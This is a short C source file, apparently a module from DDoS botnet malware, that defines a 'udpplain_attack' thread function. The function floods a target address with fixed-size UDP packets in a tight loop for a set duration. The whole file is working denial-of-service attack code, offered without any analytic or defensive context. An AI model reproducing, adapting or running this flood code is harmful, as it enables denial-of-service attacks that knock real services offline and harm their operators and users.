#define _GNU_SOURCE

#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <stdio.h>
#include <unistd.h>

#include "udpplain_attack.h"

void* udpplain_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    if (params->psize <= 0 || params->psize > 1450) {
        params->psize = 1450;
    }

    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0) return NULL;

    char *data = malloc(params->psize);
    if (!data) {
        close(fd);
        return NULL;
    }
    memset(data, 0xFF, params->psize);

    time_t end_time = time(NULL) + params->duration;

    while (time(NULL) < end_time && params->active) {
        sendto(fd, data, params->psize, MSG_NOSIGNAL, (struct sockaddr *)&params->target_addr, sizeof(params->target_addr));
    }

    close(fd);
    free(data);
    return NULL;
}
